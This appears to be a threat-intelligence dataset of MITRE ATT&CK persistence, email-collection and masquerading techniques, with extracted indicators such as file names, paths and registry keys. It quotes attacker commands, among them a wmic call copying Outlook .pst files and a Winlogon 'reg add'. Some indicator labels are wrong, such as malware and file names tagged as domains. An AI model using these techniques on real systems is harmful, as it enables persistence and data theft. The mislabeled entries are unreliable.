T1505.005,Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.   [1]       Windows Service s that are run as a ""generic"" process (ex:  svchost.exe ) load the service's DLL file, the location of which is stored in a Registry entry named  ServiceDll .   [2]    The  termsrv.dll  file, typically stored in  %SystemRoot%\System32\ , is the default  ServiceDll  value for Terminal Services in  HKLM\System\CurrentControlSet\services\TermService\Parameters\ .   Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.   [3]    Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal  termsrv.dll  functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent  Remote Desktop Protocol  sessions by either patching the  termsrv.dll  file or modifying the  ServiceDll  value to point to a DLL that provides increased RDP functionality.   [4]      [5]    On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",Description,file,termsrv.dll
T1114.001,Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.   Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.   [1]    IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in  C:\Users\&lt;username&gt;\Documents\Outlook Files  or  C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Outlook .   [2]",Description,path,C:\Users
T1114.001,Local Email Collection,"Chimera  has harvested data from victim's e-mail including through execution of  wmic /node:  process call create ""cmd /c copy c:\Users\ \ \backup.pst c:\windows\temp\backup.pst"" copy ""i:\ \ \My Documents\ .pst""copy       .   [5]",Procedure Examples,path,i:\ \ \My Documents\ .pst
T1114.001,Local Email Collection,"Chimera  has harvested data from victim's e-mail including through execution of  wmic /node:  process call create ""cmd /c copy c:\Users\ \ \backup.pst c:\windows\temp\backup.pst"" copy ""i:\ \ \My Documents\ .pst""copy       .   [5]",Procedure Examples,path,"/node:  process call create ""cmd /c copy c:\Users\ \ \backup.pst"
T1114.001,Local Email Collection,"Chimera  has harvested data from victim's e-mail including through execution of  wmic /node:  process call create ""cmd /c copy c:\Users\ \ \backup.pst c:\windows\temp\backup.pst"" copy ""i:\ \ \My Documents\ .pst""copy       .   [5]",Procedure Examples,path,c:\windows\temp\backup.pst
T1546.007,Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.   [1]    The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at  HKLM\SOFTWARE\Microsoft\Netsh .   Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.   [2]      [3]",Description,registry-key,HKLM\SOFTWARE\Microsoft\Netsh
T1546.007,Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.   [1]    The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at  HKLM\SOFTWARE\Microsoft\Netsh .   Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.   [2]      [3]",Description,file,Netsh.exe
T1546.007,Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.   [1]    The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at  HKLM\SOFTWARE\Microsoft\Netsh .   Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.   [2]      [3]",Description,file,netsh.exe
T1546.007,Netsh Helper DLL,netsh  can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.   [3],Procedure Examples,file,netsh.exe
T1547.004,Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in  HKLM\Software[\Wow6432Node\]\Microsoft\Windows NT\CurrentVersion\Winlogon\  and  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\  are used to manage additional helper programs and functionalities that support Winlogon.   [1]       Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:    [1]      Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",Description,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
T1547.004,Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in  HKLM\Software[\Wow6432Node\]\Microsoft\Windows NT\CurrentVersion\Winlogon\  and  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\  are used to manage additional helper programs and functionalities that support Winlogon.   [1]       Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:    [1]      Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",Description,registry-key,HKLM\Software
T1547.004,Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in  HKLM\Software[\Wow6432Node\]\Microsoft\Windows NT\CurrentVersion\Winlogon\  and  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\  are used to manage additional helper programs and functionalities that support Winlogon.   [1]       Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:    [1]      Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",Description,registry-key,HKCU\Software\Microsoft\Windows
T1547.004,Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in  HKLM\Software[\Wow6432Node\]\Microsoft\Windows NT\CurrentVersion\Winlogon\  and  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\  are used to manage additional helper programs and functionalities that support Winlogon.   [1]       Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:    [1]      Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",Description,file,Winlogon.exe
T1547.004,Winlogon Helper DLL,Cannon  adds the Registry key  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon  to establish persistence.   [3],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
T1547.004,Winlogon Helper DLL,Cannon  adds the Registry key  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon  to establish persistence.   [3],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1547.004,Winlogon Helper DLL,"Gazer  can establish persistence by setting the value ""Shell"" with ""explorer.exe, %malware_pathfile%"" under the Registry key  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon .   [5]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1547.004,Winlogon Helper DLL,"Gazer  can establish persistence by setting the value ""Shell"" with ""explorer.exe, %malware_pathfile%"" under the Registry key  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon .   [5]",Procedure Examples,file,explorer.exe
T1547.004,Winlogon Helper DLL,"KeyBoy  issues the command  reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon""  to achieve persistence.   [6]       [7]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
T1547.004,Winlogon Helper DLL,"KeyBoy  issues the command  reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon""  to achieve persistence.   [6]       [7]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1547.004,Winlogon Helper DLL,Remexi  achieves persistence using Userinit by adding the Registry key  HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit .   [8],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows
T1547.004,Winlogon Helper DLL,Tropic Trooper  has created the Registry key  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  and sets the value to establish persistence.   [9]      [10],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
T1547.004,Winlogon Helper DLL,Tropic Trooper  has created the Registry key  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  and sets the value to establish persistence.   [9]      [10],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1547.004,Winlogon Helper DLL,Turla  established persistence by adding a Shell value under the Registry key  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon .   [11],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1547.004,Winlogon Helper DLL,Wizard Spider  has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.   [12],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
T1547.004,Winlogon Helper DLL,Wizard Spider  has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.   [12],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1137.002,Office Test,APT28  has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key  HKCU\Software\Microsoft\Office test\Special\Perf  to execute code.   [2],Procedure Examples,registry-key,HKCU\Software\Microsoft\Office test\Special\Perf
T1137.002,Office Test,APT28  has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key  HKCU\Software\Microsoft\Office test\Special\Perf  to execute code.   [2],Procedure Examples,registry-key,HKCU\Software\Microsoft\Office
T1565.003,Runtime Data Manipulation,APT38  has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.   [1],Procedure Examples,domain,dyepack.fox
T1036.005,Match Legitimate Name or Location,"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.   Adversaries may also use the same icon of the file they are trying to mimic.",Description,file,svchost.exe
T1036.005,Match Legitimate Name or Location,"admin@338  actors used the following command to rename one of their tools to a benign file name:  ren ""%temp%\upload"" audiodg.exe    [1]",Procedure Examples,file,audiodg.exe
T1036.005,Match Legitimate Name or Location,AppleSeed  has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.   [3],Procedure Examples,file,ESTCommon.dll
T1036.005,Match Legitimate Name or Location,"The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by  APT1  as a name for malware.   [4]      [5]",Procedure Examples,file,AcroRD32.exe
T1036.005,Match Legitimate Name or Location,APT32  has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update.  APT32  has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe.    [10]      [11],Procedure Examples,file,kb-10233.exe
T1036.005,Match Legitimate Name or Location,APT32  has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update.  APT32  has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe.    [10]      [11],Procedure Examples,file,install_flashplayers.exe
T1036.005,Match Legitimate Name or Location,"APT39  has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.   [12]      [13]",Procedure Examples,file,mfevtpse.exe
T1036.005,Match Legitimate Name or Location,"APT39  has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.   [12]      [13]",Procedure Examples,file,mfevtps.exe
T1036.005,Match Legitimate Name or Location,Bad Rabbit  has masqueraded as a Flash Player installer through the executable file  install_flash_player.exe .   [18]      [19],Procedure Examples,file,install_flash_player.exe
T1036.005,Match Legitimate Name or Location,Bisonal  has renamed malicious code to  msacm32.dll  to hide within a legitimate library; earlier versions were disguised as  winhelp .   [24],Procedure Examples,file,msacm32.dll
T1036.005,Match Legitimate Name or Location,Blue Mockingbird  has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.   [26],Procedure Examples,file,wercplsupporte.dll
T1036.005,Match Legitimate Name or Location,Blue Mockingbird  has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.   [26],Procedure Examples,file,wercplsupport.dll
T1036.005,Match Legitimate Name or Location,"Bumblebee  has named component DLLs ""RapportGP.dll"" to match those used by the security company Trusteer.   [28]",Procedure Examples,file,RapportGP.dll
T1036.005,Match Legitimate Name or Location,"Carbanak  has named malware ""svchost.exe,"" which is the name of the Windows shared service host program.   [31]",Procedure Examples,file,svchost.exe
T1036.005,Match Legitimate Name or Location,"Carberp  has masqueraded as Windows system file names, as well as ""chkntfs.exe"" and ""syscron.exe"".   [32]      [33]",Procedure Examples,file,chkntfs.exe
T1036.005,Match Legitimate Name or Location,"Carberp  has masqueraded as Windows system file names, as well as ""chkntfs.exe"" and ""syscron.exe"".   [32]      [33]",Procedure Examples,file,syscron.exe
T1036.005,Match Legitimate Name or Location,"Chaes  has used an unsigned, crafted DLL module named  hha.dll  that was designed to look like a legitimate 32-bit Windows DLL.   [34]",Procedure Examples,file,hha.dll
T1036.005,Match Legitimate Name or Location,ChChes  copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).   [35],Procedure Examples,file,notron.exe
T1036.005,Match Legitimate Name or Location,"Chimera  has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.   [36]",Procedure Examples,domain,recordedtv.ms
T1036.005,Match Legitimate Name or Location,"Chimera  has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.   [36]",Procedure Examples,file,GoogleUpdate.exe
T1036.005,Match Legitimate Name or Location,"Chimera  has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.   [36]",Procedure Examples,file,jucheck.exe
T1036.005,Match Legitimate Name or Location,"Chimera  has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.   [36]",Procedure Examples,file,update.exe
T1036.005,Match Legitimate Name or Location,"Chimera  has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.   [36]",Procedure Examples,file,msadcs1.exe
T1036.005,Match Legitimate Name or Location,Chinoxy  has used the name  eoffice.exe  in attempt to appear as a legitimate file.   [37],Procedure Examples,file,eoffice.exe
T1036.005,Match Legitimate Name or Location,DanBot  files have been named  UltraVNC.exe  and  WINVNC.exe  to appear as legitimate VNC tools.   [40],Procedure Examples,file,UltraVNC.exe
T1036.005,Match Legitimate Name or Location,DanBot  files have been named  UltraVNC.exe  and  WINVNC.exe  to appear as legitimate VNC tools.   [40],Procedure Examples,file,WINVNC.exe
T1036.005,Match Legitimate Name or Location,DarkComet  has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.   [41],Procedure Examples,file,winupdate.exe
T1036.005,Match Legitimate Name or Location,"DRATzarus  has been named  Flash.exe , and its dropper has been named  IExplorer .   [45]",Procedure Examples,file,Flash.exe
T1036.005,Match Legitimate Name or Location,"Earth Lusca  used the command  move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll  to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.   [47]",Procedure Examples,path,c:\windows\system32\spool\prtprocs\x64\spool.dll
T1036.005,Match Legitimate Name or Location,"Earth Lusca  used the command  move [file path] c:\windows\system32\spool\prtprocs\x64\spool.dll  to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.   [47]",Procedure Examples,file,spool.dll
T1036.005,Match Legitimate Name or Location,EKANS  has been disguised as  update.exe  to appear as a valid executable.   [48],Procedure Examples,file,update.exe
T1036.005,Match Legitimate Name or Location,"If installing itself as a service fails,  Elise  instead writes itself as a file named svchost.exe saved in %APPDATA%\Microsoft\Network.   [49]",Procedure Examples,file,svchost.exe
T1036.005,Match Legitimate Name or Location,"Ferocious Kitten  has named malicious files  update.exe  and loaded them into the compromise host's ""Public"" folder.   [51]",Procedure Examples,file,update.exe
T1036.005,Match Legitimate Name or Location,FIN7  has attempted to run Darkside ransomware with the filename sleep.exe.   [52],Procedure Examples,file,sleep.exe
T1036.005,Match Legitimate Name or Location,FinFisher  renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.   [53]      [54],Procedure Examples,file,uxtheme.dll
T1036.005,Match Legitimate Name or Location,"FoggyWeb  can be disguised as a Visual Studio file such as  Windows.Data.TimeZones.zh-PH.pri  to evade detection. Also,  FoggyWeb 's loader can mimic a genuine  dll  file that carries out the same import functions as the legitimate Windows  version.dll  file.   [55]",Procedure Examples,file,version.dll
T1036.005,Match Legitimate Name or Location,"Gelsemium  has named malicious binaries  serv.exe ,  winprint.dll , and  chrome_elf.dll  and has set its persistence in the Registry with the key value  Chrome Update  to appear legitimate.   [59]",Procedure Examples,file,serv.exe
T1036.005,Match Legitimate Name or Location,"Gelsemium  has named malicious binaries  serv.exe ,  winprint.dll , and  chrome_elf.dll  and has set its persistence in the Registry with the key value  Chrome Update  to appear legitimate.   [59]",Procedure Examples,file,winprint.dll
T1036.005,Match Legitimate Name or Location,"Gelsemium  has named malicious binaries  serv.exe ,  winprint.dll , and  chrome_elf.dll  and has set its persistence in the Registry with the key value  Chrome Update  to appear legitimate.   [59]",Procedure Examples,file,chrome_elf.dll
T1036.005,Match Legitimate Name or Location,"Goopy  has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.   [10]",Procedure Examples,file,goopdate.dll
T1036.005,Match Legitimate Name or Location,"Goopy  has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.   [10]",Procedure Examples,file,GoogleUpdate.exe
T1036.005,Match Legitimate Name or Location,HermeticWiper  has used the name  postgressql.exe  to mask a malicious payload.   [67],Procedure Examples,file,postgressql.exe
T1036.005,Match Legitimate Name or Location,HermeticWizard  has been named  exec_32.dll  to mimic a legitimate MS Outlook .dll.   [67],Procedure Examples,file,exec_32.dll
T1036.005,Match Legitimate Name or Location,HTTPBrowser 's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.   [68],Procedure Examples,file,navlu.dll
T1036.005,Match Legitimate Name or Location,InnaputRAT  variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.   [71],Procedure Examples,file,SafeApp.exe
T1036.005,Match Legitimate Name or Location,InnaputRAT  variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.   [71],Procedure Examples,file,NeutralApp.exe
T1036.005,Match Legitimate Name or Location,"InvisiMole  has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.   [72]      [73]",Procedure Examples,file,mpr.dll
T1036.005,Match Legitimate Name or Location,"Ixeshe  has used registry values and file names associated with Adobe software, such as AcroRd32.exe.   [74]",Procedure Examples,file,AcroRd32.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,path,C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,path,C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,path,C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,path,C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,file,AERTSr.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,file,FoxitRdr64.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,file,airappinstall.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,file,AcroRd64.exe
T1036.005,Match Legitimate Name or Location,"Ke3chang  has dropped their malware into legitimate installed software paths including:  C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe ,  C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe ,  C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe , and  C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe .   [75]",Procedure Examples,path,C:\Program
T1036.005,Match Legitimate Name or Location,Kimsuky  has renamed malware to legitimate names such as  ESTCommon.dll  or  patch.dll .   [77],Procedure Examples,file,ESTCommon.dll
T1036.005,Match Legitimate Name or Location,Kimsuky  has renamed malware to legitimate names such as  ESTCommon.dll  or  patch.dll .   [77],Procedure Examples,file,patch.dll
T1036.005,Match Legitimate Name or Location,"LookBack  has a C2 proxy tool that masquerades as  GUP.exe , which is software used by Notepad++.   [84]",Procedure Examples,file,GUP.exe
T1036.005,Match Legitimate Name or Location,Magic Hound  has used the name dllhost.exe to mask a malicious tool used in C2.   [88],Procedure Examples,file,dllhost.exe
T1036.005,Match Legitimate Name or Location,MarkiRAT  can masquerade as  update.exe  and  svehost.exe ; it has also mimicked legitimate Telegram and Chrome files.   [51],Procedure Examples,file,update.exe
T1036.005,Match Legitimate Name or Location,MarkiRAT  can masquerade as  update.exe  and  svehost.exe ; it has also mimicked legitimate Telegram and Chrome files.   [51],Procedure Examples,file,svehost.exe
T1036.005,Match Legitimate Name or Location,"MechaFlounder  has been downloaded as a file named lsass.exe, which matches the legitimate Windows file.   [90]",Procedure Examples,file,lsass.exe
T1036.005,Match Legitimate Name or Location,"Mis-Type  saves itself as a file named  msdtc.exe , which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.   [94]      [95]",Procedure Examples,file,msdtc.exe
T1036.005,Match Legitimate Name or Location,"Misdat  saves itself as a file named  msdtc.exe , which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.   [94]      [95]",Procedure Examples,file,msdtc.exe
T1036.005,Match Legitimate Name or Location,"Mustang Panda  has used names like  adobeupdate.dat  and  PotPlayerDB.dat  to disguise  PlugX , and a file named  OneDrive.exe  to load a  Cobalt Strike  payload.   [99]",Procedure Examples,file,OneDrive.exe
T1036.005,Match Legitimate Name or Location,Nebulae  uses functions named  StartUserModeBrowserInjection  and  StopUserModeBrowserInjection  indicating that it's trying to imitate chrome_frame_helper.dll.   [100],Procedure Examples,file,chrome_frame_helper.dll
T1036.005,Match Legitimate Name or Location,NOKKI  is written to %LOCALAPPDATA%\MicroSoft Updatea\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.   [102],Procedure Examples,file,svServiceUpdate.exe
T1036.005,Match Legitimate Name or Location,"OLDBAIT  installs itself in  %ALLUSERPROFILE%\Application Data\Microsoft\MediaPlayer\updatewindws.exe ; the directory name is missing a space and the file name is missing the letter ""o.""   [105]",Procedure Examples,file,updatewindws.exe
T1036.005,Match Legitimate Name or Location,"During  Operation CuckooBees , the threat actors renamed a malicious executable to  rundll32.exe  to allow it to blend in with other Windows system files.   [106]",Procedure Examples,file,rundll32.exe
T1036.005,Match Legitimate Name or Location,"During  Operation Sharpshooter , threat actors installed  Rising Sun  in the Startup folder and disguised it as  mssync.exe .   [108]",Procedure Examples,file,mssync.exe
T1036.005,Match Legitimate Name or Location,"OwaAuth  uses the filename owaauth.dll, which is a legitimate file that normally resides in  %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\ ; the malicious file by the same name is saved in  %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\ .   [112]",Procedure Examples,file,owaauth.dll
T1036.005,Match Legitimate Name or Location,"Patchwork  installed its payload in the startup programs folder as ""Baidu Software Update."" The group also adds its second stage payload to the startup programs as ""Net Monitor.""   [113]    They have also dropped  QuasarRAT  binaries as files named microsoft_network.exe and crome.exe.   [114]",Procedure Examples,file,microsoft_network.exe
T1036.005,Match Legitimate Name or Location,"Patchwork  installed its payload in the startup programs folder as ""Baidu Software Update."" The group also adds its second stage payload to the startup programs as ""Net Monitor.""   [113]    They have also dropped  QuasarRAT  binaries as files named microsoft_network.exe and crome.exe.   [114]",Procedure Examples,file,crome.exe
T1036.005,Match Legitimate Name or Location,PcShare  has been named  wuauclt.exe  to appear as the legitimate Windows Update AutoUpdate Client.   [37],Procedure Examples,file,wuauclt.exe
T1036.005,Match Legitimate Name or Location,PowGoop  has used a DLL named Goopdate.dll to impersonate a legitimate Google update file.   [120],Procedure Examples,file,Goopdate.dll
T1036.005,Match Legitimate Name or Location,PyDCrypt  has dropped  DCSrv  under the  svchost.exe  name to disk.   [125],Procedure Examples,file,svchost.exe
